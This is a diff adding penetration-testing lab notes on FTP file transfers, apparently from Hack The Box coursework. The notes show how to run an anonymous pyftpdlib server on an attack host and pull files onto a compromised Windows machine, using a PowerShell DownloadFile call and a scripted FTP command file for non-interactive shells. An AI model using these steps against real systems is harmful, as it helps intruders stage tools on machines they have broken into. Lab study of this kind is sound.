@@ -107,8 +107,35 @@ You can't access this shared folder because your organization's security policie
 
 ### FTP Downloads
 
+- We can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. Installing the FTP Server Python3 Module - pyftpdlib: `sudo pip3 install pyftpdlib`
 
+> [!NOTE]
+> We can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.
 
+- Setting up a Python3 FTP Server: `sudo python3 -m pyftpdlib --port 21`
+- After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell Net.WebClient: `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`
 
+> [!TIP]
+> When we get a shell on a remote machine, we may not have an interactive shell. 
+> If that's the case, we can create an FTP command file to download a file. 
+> First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
+> Create a Command File for the FTP Client and Download the Target File:
+```
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo GET file.txt >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+Log in with USER and PASS first.
+ftp> USER anonymous
+
+ftp> GET file.txt
+ftp> bye
+
+C:\htb>more file.txt
+This is a test file
+```
 
 
